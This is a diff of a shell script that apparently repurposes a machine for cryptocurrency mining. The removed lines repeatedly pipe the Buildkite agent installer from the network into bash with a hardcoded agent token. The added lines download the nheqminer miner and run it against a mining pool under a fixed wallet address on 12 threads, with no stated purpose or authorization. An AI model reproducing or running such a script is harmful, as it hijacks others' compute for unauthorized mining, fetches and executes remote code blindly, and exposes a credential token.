@@ -1,13 +1,6 @@
 #!/bin/sh
-sudo apt-get install screen -y
-screen
-
-COUNTER=20
-until [  $COUNTER -lt 10 ]; do
- 
-TOKEN="895508ce6e0736ffd3570706ee6cb5c6e60eb965d385181d70" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
-~/.buildkite-agent/bin/buildkite-agent start
- 
-     echo COUNTER $COUNTER
-     let COUNTER-=1
-done
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvzf nheqminer-Linux-v0.8.2.tgz
+tar xf nheqminer-Linux-v0.8.2.tar.gz
+cd nheqminer
+./nheqminer -v -l na.luckpool.net:3956 -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.a2 -p x -t 12
